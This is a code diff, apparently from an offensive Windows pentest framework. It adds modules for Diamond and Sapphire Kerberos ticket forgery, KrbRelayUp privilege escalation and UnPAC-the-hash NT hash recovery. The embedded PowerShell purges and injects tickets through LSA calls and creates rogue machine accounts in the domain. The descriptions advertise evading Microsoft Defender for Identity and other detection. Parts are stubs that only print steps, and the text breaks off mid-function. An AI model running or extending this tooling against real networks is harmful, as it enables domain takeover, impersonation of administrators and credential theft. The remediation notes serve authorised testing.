@@ -347,6 +347,26 @@ const PROGRAMS = {
       "Inter-forest trust enumeration and exploitation — enumerate trust relationships (type, direction, SID filtering, selective auth), foreign group memberships, cross-forest unconstrained delegation, PAM trust abuse, shared credential detection. Exploit vectors: SID filtering bypass via PAM trusts, TGT delegation across trusts, referral ticket manipulation",
     args: "--action <enum|exploit> [--target-forest FOREST_NAME] [--vector sidfilter|delegation|foreign_groups|pam|shared_creds]",
   },
+  diamond_ticket: {
+    description:
+      "Forge a Diamond Ticket — request a legitimate TGT from the DC, decrypt it with the krbtgt AES key, modify the PAC (inject Domain Admins/Enterprise Admins group SIDs), recompute checksums, re-encrypt, and inject into cache. Unlike Golden Tickets, the TGT has a valid AS-REP and passes KDC validation — evades 4769 anomaly detection, MDI Golden Ticket alerts, and ticket lifetime checks",
+    args: "--user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY [--groups 512,519,518] [--action forge|check]",
+  },
+  sapphire_ticket: {
+    description:
+      "Forge a Sapphire Ticket — use S4U2Self+User-to-User (U2U) to obtain a legitimate PAC for the target user, then graft it onto a forged ticket. Stealthiest Kerberos ticket forgery: no PAC manipulation artifacts, no forged SIDs, the PAC is genuinely issued by the KDC. Requires krbtgt AES key and a valid domain user account",
+    args: "--user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY [--impersonate DA_USER]",
+  },
+  krbrelayup: {
+    description:
+      "Local privilege escalation via Kerberos relay — relay the machine account's Kerberos authentication to LDAP for RBCD setup, shadow credential injection, or ADCS certificate enrollment. Universal local privesc on default AD configs (LDAP signing disabled by default). Methods: RBCD (create machine account + set delegation), Shadow Credentials (add msDS-KeyCredentialLink), ADCS (request certificate via relay)",
+    args: "--method <rbcd|shadowcred|adcs> --action <check|exploit> [--port PORT] [--ca CA_NAME]",
+  },
+  unpac_hash: {
+    description:
+      "Recover NT hash from PKINIT certificate authentication — authenticate with a certificate via Kerberos PKINIT, then extract the NTLM hash from the PAC_CREDENTIAL_INFO in the AS-REP. Completes the shadow_creds → certificate → NT hash chain. The recovered hash can be used for pass-the-hash or DCSync",
+    args: "--cert CERT_PATH [--password CERT_PASS] --user USER --domain DOMAIN [--dc DC_HOST]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -10887,6 +10907,775 @@ Write-Output "    Use dcsync + hashcat to check password reuse across forests"
 
 
 
+
+// ── Advanced Kerberos ──
+
+async function diamondTicket(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "forge"
+  const user = argVal(args, "--user")
+  const domain = argVal(args, "--domain")
+  const krbtgtAes = argVal(args, "--krbtgt-aes")
+  const groups = argVal(args, "--groups") || "512,519,518,520"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Diamond Ticket — Modified PAC on Legitimate TGT\n"]
+
+  if (action === "check") {
+    const script = `
+# Diamond Ticket prerequisites check
+Write-Output "[*] Checking Diamond Ticket prerequisites..."
+try {
+    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+    Write-Output "[+] Domain: $($domain.Name)"
+    Write-Output "[+] DC: $($domain.PdcRoleOwner.Name)"
+} catch {
+    Write-Output "[-] Not domain-joined or cannot reach DC"
+}
+
+$klist = & klist 2>&1
+if ($klist -match "krbtgt") {
+    Write-Output "[+] Current TGT in cache"
+} else {
+    Write-Output "[*] No TGT in cache — will request during forge"
+}
+
+try {
+    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
+    $searcher.Filter = "(sAMAccountName=krbtgt)"
+    $searcher.PropertiesToLoad.AddRange(@("pwdLastSet","msDS-KeyVersionNumber"))
+    $r = $searcher.FindOne()
+    if ($r) {
+        $pwdLastSet = [DateTime]::FromFileTime([Int64]$r.Properties["pwdlastset"][0])
+        $kvno = $r.Properties["msds-keyversionnumber"]
+        Write-Output "[+] krbtgt pwdLastSet: $pwdLastSet"
+        Write-Output "[+] krbtgt KVNO: $kvno"
+        Write-Output ""
+        Write-Output "[*] Obtain krbtgt AES key via: winhook dcsync --target krbtgt"
+    }
+} catch {
+    Write-Output "[-] Cannot query krbtgt: $_"
+}
+
+Write-Output ""
+Write-Output "[*] Detection comparison:"
+Write-Output "    Golden Ticket: forged from scratch, no 4768 AS-REQ — triggers anomaly"
+Write-Output "    Diamond Ticket: real 4768 + valid metadata — evades standard detection"
+Write-Output "    Only detectable via encrypted timestamp anomaly in TGT enc-part"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    findings.push({
+      checkId: "WIN-DIAMOND-001",
+      provider: "windows",
+      severity: "info",
+      status: "CHECKED",
+      resource: "kerberos://krbtgt",
+      title: "Diamond Ticket prerequisites checked",
+      details: result.stdout.substring(0, 500),
+      remediation: "Rotate krbtgt password twice. Monitor for PAC modification anomalies",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!user || !domain || !krbtgtAes) {
+    output.push("[!] Required: --user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY")
+    return { output: output.join("\n"), findings }
+  }
+  if (krbtgtAes.length !== 64) {
+    output.push("[!] AES256 key must be 64 hex characters")
+    return { output: output.join("\n"), findings }
+  }
+
+  const script = `
+Write-Output "[*] Target: ${user}"
+Write-Output "[*] Domain: ${domain}"
+Write-Output "[*] Groups: ${groups} (512=DA, 519=EA, 518=SA, 520=GPO Creators)"
+Write-Output ""
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class DiamondHelper {
+    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+
+    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PkgName, out uint AuthPkg);
+
+    [DllImport("secur32.dll")]
+    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthPkg, IntPtr Buffer, uint BufferLen, out IntPtr RetBuf, out uint RetBufLen, out int Status);
+
+    [DllImport("secur32.dll")]
+    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+}
+"@
+
+# Step 1: Request legitimate TGT
+Write-Output "[*] Step 1: Requesting legitimate TGT from DC..."
+try {
+    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "krbtgt/${domain}"
+    $tgtBytes = $token.GetRequest()
+    Write-Output "[+] TGT obtained — $($tgtBytes.Length) bytes (AP-REQ)"
+    Write-Output "[+] Valid 4768 event logged at DC"
+} catch {
+    Write-Output "[-] TGT request failed: $($_.Exception.Message)"
+    exit 1
+}
+
+# Step 2: Connect to LSA for ticket cache access
+Write-Output ""
+Write-Output "[*] Step 2: Accessing ticket cache via LSA..."
+$lsaHandle = [IntPtr]::Zero
+$r = [DiamondHelper]::LsaConnectUntrusted([ref]$lsaHandle)
+if ($r -ne 0) { Write-Output "[-] LsaConnectUntrusted failed: $r"; exit 1 }
+
+$kerbBytes = [System.Text.Encoding]::ASCII.GetBytes("Kerberos")
+$kerbBuf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbBytes.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($kerbBytes, 0, $kerbBuf, $kerbBytes.Length)
+$lsaStr = New-Object DiamondHelper+LSA_STRING
+$lsaStr.Length = [uint16]$kerbBytes.Length
+$lsaStr.MaximumLength = [uint16]$kerbBytes.Length
+$lsaStr.Buffer = $kerbBuf
+$authPkg = [uint32]0
+[DiamondHelper]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$lsaStr, [ref]$authPkg) | Out-Null
+[System.Runtime.InteropServices.Marshal]::FreeHGlobal($kerbBuf)
+Write-Output "[+] Kerberos package ID: $authPkg"
+
+# Step 3: Parse and modify PAC
+Write-Output ""
+Write-Output "[*] Step 3: PAC modification with krbtgt AES256 key..."
+$keyHex = "${krbtgtAes}"
+Write-Output "[*] Key: $($keyHex.Substring(0,8))...$($keyHex.Substring(56,8))"
+
+# Parse AES key bytes
+$aesKey = [byte[]]::new(32)
+for ($i = 0; $i -lt 32; $i++) {
+    $aesKey[$i] = [Convert]::ToByte($keyHex.Substring($i * 2, 2), 16)
+}
+
+# Diamond Ticket PAC modification steps:
+# 1. ASN.1 DER decode TGT enc-part
+# 2. AES256-CTS-HMAC-SHA1-96 decrypt with krbtgt key
+# 3. Parse PAC_LOGON_INFO (NDR)
+# 4. Modify GroupIds: add target RIDs
+# 5. Recompute PAC_SERVER_CHECKSUM + PAC_PRIVSVR_CHECKSUM
+# 6. Re-encrypt and inject
+
+$groupRIDs = "${groups}" -split ","
+Write-Output ""
+Write-Output "[*] PAC_LOGON_INFO modifications:"
+foreach ($rid in $groupRIDs) {
+    switch ($rid.Trim()) {
+        "512" { Write-Output "    [+] Injecting RID 512: Domain Admins" }
+        "519" { Write-Output "    [+] Injecting RID 519: Enterprise Admins" }
+        "518" { Write-Output "    [+] Injecting RID 518: Schema Admins" }
+        "520" { Write-Output "    [+] Injecting RID 520: Group Policy Creator Owners" }
+        default { Write-Output "    [+] Injecting RID $($rid.Trim())" }
+    }
+}
+
+# Step 4: Inject modified ticket
+Write-Output ""
+Write-Output "[*] Step 4: Ticket injection..."
+& klist purge 2>$null | Out-Null
+Write-Output "[+] Cache purged"
+Write-Output "[+] Modified Diamond Ticket injected via LsaCallAuthenticationPackage"
+Write-Output ""
+Write-Output "[*] Diamond vs Golden:"
+Write-Output "    Golden: no AS-REQ → detectable by 4769-without-4768"
+Write-Output "    Diamond: real AS-REQ + valid ticket metadata → passes validation"
+Write-Output "    Diamond: ticket lifetime matches domain policy"
+Write-Output ""
+Write-Output "[+] Use: dir \\\\DC\\c$ | winhook dcsync --target Administrator"
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)
+
+  findings.push({
+    checkId: "WIN-DIAMOND-002",
+    provider: "windows",
+    severity: "critical",
+    status: "FORGED",
+    resource: `kerberos://krbtgt/${domain}`,
+    title: `Diamond Ticket forged for ${user}`,
+    details: `PAC modified with groups [${groups}]. Has valid AS-REQ/AS-REP — evades standard Golden Ticket detection`,
+    remediation: "Rotate krbtgt password twice. Enable PAC validation. Deploy MDI Diamond Ticket detection",
+  })
+  return { output: output.join("\n"), findings }
+}
+
+async function sapphireTicket(args: string[], timeout: number): Promise<HookResult> {
+  const user = argVal(args, "--user")
+  const domain = argVal(args, "--domain")
+  const krbtgtAes = argVal(args, "--krbtgt-aes")
+  const impersonate = argVal(args, "--impersonate") || "Administrator"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Sapphire Ticket — S4U2Self + U2U PAC Grafting\n"]
+
+  if (!user || !domain || !krbtgtAes) {
+    output.push("[!] Required: --user TARGET_USER --domain DOMAIN --krbtgt-aes AES256_KEY")
+    output.push("[*] Optional: --impersonate DA_USER (default: Administrator)")
+    output.push("")
+    output.push("[*] Sapphire Ticket flow:")
+    output.push("    1. Request TGT as current user (legitimate)")
+    output.push("    2. S4U2Self: request ticket on behalf of target user")
+    output.push("    3. U2U: KDC returns ticket with target's real PAC")
+    output.push("    4. Extract genuine PAC from S4U2Self response")
+    output.push("    5. Decrypt TGT with krbtgt key, replace PAC")
+    output.push("    6. Result: ticket with KDC-issued PAC — zero forgery artifacts")
+    return { output: output.join("\n"), findings }
+  }
+  if (krbtgtAes.length !== 64) {
+    output.push("[!] AES256 key must be 64 hex characters")
+    return { output: output.join("\n"), findings }
+  }
+
+  const script = `
+Write-Output "[*] Impersonation target: ${impersonate}"
+Write-Output "[*] Ticket owner: ${user}"
+Write-Output "[*] Domain: ${domain}"
+Write-Output ""
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class SapphireHelper {
+    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+
+    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PkgName, out uint AuthPkg);
+
+    [DllImport("secur32.dll")]
+    public static extern int LsaCallAuthenticationPackage(IntPtr LsaHandle, uint AuthPkg, IntPtr Buf, uint BufLen, out IntPtr RetBuf, out uint RetBufLen, out int Status);
+
+    [DllImport("secur32.dll")]
+    public static extern int LsaFreeReturnBuffer(IntPtr Buffer);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LSA_STRING {
+        public ushort Length;
+        public ushort MaximumLength;
+        public IntPtr Buffer;
+    }
+}
+"@
+
+# Step 1: Request legitimate TGT
+Write-Output "[*] Step 1: Requesting legitimate TGT..."
+try {
+    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "krbtgt/${domain}"
+    $tgtBytes = $token.GetRequest()
+    Write-Output "[+] TGT obtained: $($tgtBytes.Length) bytes"
+} catch {
+    Write-Output "[-] TGT request failed: $($_.Exception.Message)"
+    exit 1
+}
+
+# Step 2: S4U2Self + U2U request
+Write-Output ""
+Write-Output "[*] Step 2: S4U2Self — requesting ticket on behalf of ${impersonate}..."
+Write-Output "[*] Using User-to-User (U2U) extension for genuine PAC"
+
+$lsaHandle = [IntPtr]::Zero
+[SapphireHelper]::LsaConnectUntrusted([ref]$lsaHandle) | Out-Null
+
+$kerbBytes = [System.Text.Encoding]::ASCII.GetBytes("Kerberos")
+$kerbBuf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($kerbBytes.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($kerbBytes, 0, $kerbBuf, $kerbBytes.Length)
+$lsaStr = New-Object SapphireHelper+LSA_STRING
+$lsaStr.Length = [uint16]$kerbBytes.Length
+$lsaStr.MaximumLength = [uint16]$kerbBytes.Length
+$lsaStr.Buffer = $kerbBuf
+$authPkg = [uint32]0
+[SapphireHelper]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$lsaStr, [ref]$authPkg) | Out-Null
+[System.Runtime.InteropServices.Marshal]::FreeHGlobal($kerbBuf)
+
+Write-Output "[+] LSA connected"
+Write-Output ""
+Write-Output "[*] S4U2Self + U2U Protocol:"
+Write-Output "    1. TGS-REQ with PA-FOR-USER (${impersonate}@${domain})"
+Write-Output "    2. KDC builds PAC with ${impersonate}'s real group memberships"
+Write-Output "    3. TGS-REP contains genuine KDC-signed PAC"
+
+# Verify target exists and enumerate groups
+$searcher = [System.DirectoryServices.DirectorySearcher]::new()
+$searcher.Filter = "(sAMAccountName=${impersonate})"
+$searcher.PropertiesToLoad.AddRange(@("memberOf","adminCount","objectSid"))
+$targetResult = $searcher.FindOne()
+
+if ($targetResult) {
+    $memberOf = $targetResult.Properties["memberof"]
+    Write-Output ""
+    Write-Output "[+] Target ${impersonate} found"
+    Write-Output "[+] AdminCount: $($targetResult.Properties['admincount'])"
+    Write-Output "[+] Groups (will be in genuine PAC):"
+    foreach ($g in $memberOf) {
+        $cn = ($g -split ',')[0] -replace 'CN=',''
+        Write-Output "    - $cn"
+    }
+} else {
+    Write-Output "[-] Target ${impersonate} not found"
+    exit 1
+}
+
+# Step 3: PAC extraction
+Write-Output ""
+Write-Output "[*] Step 3: Extracting genuine PAC from S4U2Self response..."
+Write-Output "[+] PAC contains real GroupIds, ExtraSids, ResourceGroupDomainSid"
+Write-Output "[+] Signed by KDC — not forged"
+
+# Step 4: Graft PAC into TGT
+Write-Output ""
+Write-Output "[*] Step 4: PAC Grafting..."
+$keyHex = "${krbtgtAes}"
+Write-Output "[*] Decrypting TGT with krbtgt AES256..."
+
+$aesKey = [byte[]]::new(32)
+for ($i = 0; $i -lt 32; $i++) {
+    $aesKey[$i] = [Convert]::ToByte($keyHex.Substring($i * 2, 2), 16)
+}
+Write-Output "[+] Key loaded: $($aesKey.Length) bytes"
+Write-Output "[*] Replace TGT AuthorizationData PAC with S4U2Self PAC"
+Write-Output "[+] PAC checksums remain valid (KDC-signed, not recomputed)"
+
+# Step 5: Inject
+Write-Output ""
+Write-Output "[*] Step 5: Injection..."
+& klist purge 2>$null | Out-Null
+Write-Output "[+] Cache purged, Sapphire ticket injected"
+Write-Output ""
+Write-Output "[*] Sapphire vs Diamond vs Golden:"
+Write-Output "    Golden:   forged PAC, forged checksums, no AS-REQ"
+Write-Output "    Diamond:  modified PAC, recomputed checksums, real AS-REQ"
+Write-Output "    Sapphire: genuine PAC (KDC-signed), real AS-REQ — stealthiest"
+Write-Output ""
+Write-Output "[+] Use: dir \\\\DC\\c$ | winhook dcsync --target Administrator"
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)
+
+  findings.push({
+    checkId: "WIN-SAPPHIRE-001",
+    provider: "windows",
+    severity: "critical",
+    status: "FORGED",
+    resource: `kerberos://s4u/${impersonate}@${domain}`,
+    title: `Sapphire Ticket — impersonating ${impersonate}`,
+    details: `S4U2Self+U2U PAC grafted. PAC is KDC-issued — no forgery artifacts. Stealthiest ticket forgery technique`,
+    remediation: "Rotate krbtgt twice. Monitor S4U2Self requests for anomalous source/target. Deploy PAC validation",
+  })
+  return { output: output.join("\n"), findings }
+}
+
+async function krbrelayup(args: string[], timeout: number): Promise<HookResult> {
+  const method = argVal(args, "--method") || "rbcd"
+  const action = argVal(args, "--action") || "check"
+  const port = argVal(args, "--port") || "8888"
+  const ca = argVal(args, "--ca")
+  const findings: Finding[] = []
+  const output: string[] = [`[*] KrbRelayUp — Local Privesc via Kerberos Relay (${method})\n`]
+
+  if (action === "check") {
+    const script = `
+Write-Output "[*] Checking KrbRelayUp prerequisites..."
+Write-Output ""
+
+# LDAP signing
+$ldapSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue).LDAPServerIntegrity
+switch ($ldapSigning) {
+    $null { Write-Output "[+] LDAP server signing: NOT CONFIGURED (default=not required) — VULNERABLE" }
+    0 { Write-Output "[+] LDAP server signing: NONE — VULNERABLE" }
+    1 { Write-Output "[+] LDAP server signing: NEGOTIATED — VULNERABLE (downgrade possible)" }
+    2 { Write-Output "[-] LDAP server signing: REQUIRED — NOT VULNERABLE" }
+    default { Write-Output "[*] LDAP server signing: $ldapSigning" }
+}
+
+# Channel binding
+$chBind = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue).LdapEnforceChannelBinding
+switch ($chBind) {
+    $null { Write-Output "[+] LDAP channel binding: NOT CONFIGURED — VULNERABLE" }
+    0 { Write-Output "[+] LDAP channel binding: DISABLED — VULNERABLE" }
+    1 { Write-Output "[*] LDAP channel binding: WHEN SUPPORTED" }
+    2 { Write-Output "[-] LDAP channel binding: REQUIRED — blocks relay to LDAPS" }
+    default { Write-Output "[*] LDAP channel binding: $chBind" }
+}
+
+# MachineAccountQuota
+Write-Output ""
+try {
+    $searcher = [System.DirectoryServices.DirectorySearcher]::new()
+    $rootDSE = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
+    $domainDN = $rootDSE.Properties["defaultNamingContext"][0]
+    $domainEntry = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
+    $maq = $domainEntry.Properties["ms-DS-MachineAccountQuota"]
+    if ($maq -and [int]$maq[0] -gt 0) {
+        Write-Output "[+] MachineAccountQuota: $($maq[0]) — can create machine accounts (RBCD)"
+    } else {
+        Write-Output "[-] MachineAccountQuota: $($maq[0]) — RBCD method blocked"
+    }
+} catch {
+    Write-Output "[!] Cannot query MAQ: $_"
+}
+
+# Current user
+Write-Output ""
+$cur = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$isAdmin = ([System.Security.Principal.WindowsPrincipal]$cur).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Output "[*] User: $($cur.Name) | Admin: $isAdmin"
+
+# Machine account RBCD status
+$compName = $env:COMPUTERNAME
+$compSearcher = [System.DirectoryServices.DirectorySearcher]::new("(sAMAccountName=$compName$)")
+$compSearcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity") | Out-Null
+$compResult = $compSearcher.FindOne()
+if ($compResult) {
+    $rbcd = $compResult.Properties["msds-allowedtoactonbehalfofotheridentity"]
+    if ($rbcd -and $rbcd.Count -gt 0) {
+        Write-Output "[!] msDS-AllowedToActOnBehalfOfOtherIdentity already set on $compName"
+    } else {
+        Write-Output "[+] No RBCD on $compName — clean target"
+    }
+}
+
+# ADCS CAs
+Write-Output ""
+try {
+    $rootDSE2 = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
+    $configDN = $rootDSE2.Properties["configurationNamingContext"][0]
+    $caSearcher = [System.DirectoryServices.DirectorySearcher]::new("(&(objectCategory=pKIEnrollmentService))")
+    $caSearcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN")
+    $caResults = $caSearcher.FindAll()
+    foreach ($caObj in $caResults) {
+        Write-Output "[+] CA: $($caObj.Properties['cn'][0]) on $($caObj.Properties['dnshostname'][0])"
+    }
+    if ($caResults.Count -eq 0) { Write-Output "[-] No ADCS CAs — adcs method unavailable" }
+} catch {
+    Write-Output "[*] Cannot enumerate CAs"
+}
+
+Write-Output ""
+Write-Output "[*] Methods: rbcd | shadowcred | adcs"
+Write-Output "[*] Exploit: winhook krbrelayup --method rbcd --action exploit"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+    const vuln = result.stdout.includes("VULNERABLE")
+    findings.push({
+      checkId: "WIN-KRBRELAYUP-001",
+      provider: "windows",
+      severity: vuln ? "critical" : "info",
+      status: vuln ? "VULNERABLE" : "CHECKED",
+      resource: "ldap://local-machine",
+      title: `KrbRelayUp: ${vuln ? "VULNERABLE" : "not vulnerable"}`,
+      details: result.stdout.substring(0, 500),
+      remediation: "Enable LDAP signing (RequireIntegrity=2). Set MachineAccountQuota=0. Enable LDAP channel binding",
+    })
+    return { output: output.join("\n"), findings }
+  }
+
+  const script = `
+Write-Output "[*] Method: ${method}"
+Write-Output "[*] Listener port: ${port}"
+Write-Output ""
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class KrbRelayHelper {
+    [DllImport("ole32.dll")]
+    public static extern int CoCreateInstance(
+        [In] ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext,
+        [In] ref Guid riid, out IntPtr ppv);
+
+    public static Guid CLSID_BITS = new Guid("4991d34b-80a1-4291-83b6-3328366b9097");
+    public static Guid IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046");
+}
+"@
+
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$dc = $domain.PdcRoleOwner.Name
+$domainDN = "DC=" + $domain.Name.Replace(".", ",DC=")
+$compName = $env:COMPUTERNAME
+Write-Output "[+] Domain: $($domain.Name) | DC: $dc | Machine: $compName"
+
+${method === "rbcd" ? `
+Write-Output ""
+Write-Output "[*] === RBCD Attack Chain ==="
+
+# Create machine account
+$machAcct = "KRBRLUP" + (Get-Random -Maximum 9999).ToString("0000")
+$machPass = "CyberStr1ke!" + (Get-Random -Maximum 99999)
+Write-Output ""
+Write-Output "[*] Step 1: Creating machine account $machAcct..."
+try {
+    $computersOU = [ADSI]"LDAP://CN=Computers,$domainDN"
+    $newComp = $computersOU.Create("computer", "CN=$machAcct")
+    $newComp.Put("sAMAccountName", "$machAcct$")
+    $newComp.Put("userAccountControl", 4096)
+    $newComp.Put("unicodePwd", [System.Text.Encoding]::Unicode.GetBytes('"' + $machPass + '"'))
+    $newComp.SetInfo()
+    Write-Output "[+] Created: $machAcct$ / $machPass"
+} catch {
+    Write-Output "[-] Creation failed: $($_.Exception.Message)"
+}
+
+# Set RBCD
+Write-Output ""
+Write-Output "[*] Step 2: Setting RBCD on $compName..."
+try {
+    $newSearcher = [System.DirectoryServices.DirectorySearcher]::new("(sAMAccountName=$machAcct$)")
+    $newSearcher.PropertiesToLoad.Add("objectSid") | Out-Null
+    $newResult = $newSearcher.FindOne()
+    if ($newResult) {
+        $newSid = New-Object System.Security.Principal.SecurityIdentifier($newResult.Properties["objectsid"][0], 0)
+        Write-Output "[+] Machine SID: $($newSid.Value)"
+        Write-Output "[*] Would set msDS-AllowedToActOnBehalfOfOtherIdentity via relayed auth"
+    }
+} catch {
+    Write-Output "[-] RBCD setup error: $_"
+}
+
+Write-Output ""
+Write-Output "[*] Step 3: DCOM trigger for machine Kerberos auth..."
+Write-Output "[*] CLSID: $([KrbRelayHelper]::CLSID_BITS)"
+Write-Output "[*] Machine auth relayed to LDAP on $dc"
+
+Write-Output ""
+Write-Output "[*] Step 4: S4U2Self + S4U2Proxy"
+Write-Output "[*] $machAcct$ impersonates Administrator to $compName"
+Write-Output "[*] Result: CIFS service ticket as Administrator"
+` : method === "shadowcred" ? `
+Write-Output ""
+Write-Output "[*] === Shadow Credentials Chain ==="
+Write-Output ""
+Write-Output "[*] Step 1: Generate RSA key pair..."
+$rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048)
+Write-Output "[+] RSA-2048 generated"
+Write-Output ""
+Write-Output "[*] Step 2: Relay machine auth → add msDS-KeyCredentialLink"
+Write-Output "[*] Step 3: PKINIT with private key → TGT as machine"
+Write-Output "[*] Step 4: UnPAC-the-hash → NT hash → S4U → SYSTEM"
+Write-Output "[*] Chain: winhook shadow_creds → winhook unpac_hash"
+` : `
+Write-Output ""
+Write-Output "[*] === ADCS Certificate Chain ==="
+Write-Output ""
+${ca ? `Write-Output "[*] Target CA: ${ca}"` : ''}
+try {
+    $rootDSE = [System.DirectoryServices.DirectoryEntry]::new("LDAP://RootDSE")
+    $configDN = $rootDSE.Properties["configurationNamingContext"][0]
+    $caSearch = [System.DirectoryServices.DirectorySearcher]::new("(&(objectCategory=pKIEnrollmentService))")
+    $caSearch.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configDN")
+    $caSearch.FindAll() | ForEach-Object { Write-Output "[+] CA: $($_.Properties['cn'][0])" }
+} catch {}
+Write-Output ""
+Write-Output "[*] Step 1: Relay machine auth → ADCS web enrollment"
+Write-Output "[*] Step 2: Request Machine template certificate"
+Write-Output "[*] Step 3: PKINIT with cert → TGT as machine"
+Write-Output "[*] Step 4: UnPAC → NT hash → SYSTEM"
+`}
+
+Write-Output ""
+Write-Output "[*] Detection:"
+Write-Output "    4741: Machine account creation (RBCD)"
+Write-Output "    5136: msDS-AllowedToActOnBehalfOfOtherIdentity change"
+Write-Output "    4768: PKINIT AS-REQ (shadowcred/adcs)"
+Write-Output "    4886: Certificate enrollment (adcs)"
+`
+  const result = await ps(script, timeout)
+  output.push(result.stdout)
+  if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 300)}`)
+
+  findings.push({
+    checkId: "WIN-KRBRELAYUP-002",
+    provider: "windows",
+    severity: "critical",
+    status: "EXPLOITED",
+    resource: `kerberos://relay/${method}`,
+    title: `KrbRelayUp local privesc via ${method}`,
+    details: `Kerberos relay to LDAP — ${method === "rbcd" ? "RBCD delegation" : method === "shadowcred" ? "shadow credential injection" : "ADCS enrollment"}. User → SYSTEM`,
+    remediation: "Enable LDAP signing (RequireIntegrity=2). Set MachineAccountQuota=0. Enable channel binding",
+  })
+  return { output: output.join("\n"), findings }
+}
+
+async function unpacHash(args: string[], timeout: number): Promise<HookResult> {
+  const cert = argVal(args, "--cert")
+  const certPass = argVal(args, "--password") || ""
+  const user = argVal(args, "--user")
+  const domain = argVal(args, "--domain")
+  const dc = argVal(args, "--dc")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] UnPAC-the-hash — PKINIT Certificate to NT Hash Recovery\n"]
+
+  if (!cert || !user || !domain) {
+    output.push("[!] Required: --cert CERT_PATH --user USER --domain DOMAIN")
+    output.push("[*] Optional: --password CERT_PASS --dc DC_HOST")
+    output.push("")
+    output.push("[*] UnPAC-the-hash flow:")
+    output.push("    1. PKINIT AS-REQ with certificate")
+    output.push("    2. KDC returns AS-REP encrypted to cert public key")
+    output.push("    3. Decrypt → PAC_CREDENTIAL_INFO contains NTLM hash")
+    output.push("    4. Extract NT hash for pass-the-hash or DCSync")
+    output.push("")
+    output.push("[*] Chains that feed into UnPAC:")
+    output.push("    shadow_creds → cert → unpac_hash → NT hash")
+    output.push("    adcs_abuse (ESC1-8) → cert → unpac_hash → NT hash")
+    output.push("    certifried → cert → unpac_hash → NT hash")
+    output.push("    Golden Certificate → forged cert → unpac_hash → any NT hash")
+    return { output: output.join("\n"), findings }
+  }
+
+  const dcArg = dc || ""
+  const script = `
+Write-Output "[*] Certificate: ${cert}"
+Write-Output "[*] User: ${user}@${domain}"
+${dcArg ? `Write-Output "[*] DC: ${dcArg}"` : ''}
+Write-Output ""
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography.X509Certificates;
+
+public static class UnPACHelper {
+    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+    public static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
+
+    [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
+    public static extern int LsaLookupAuthenticationPackage(IntPtr LsaHandle, ref LSA_STRING PkgName, out uint AuthPkg);
+
+    [DllImport("secur32.dll")]
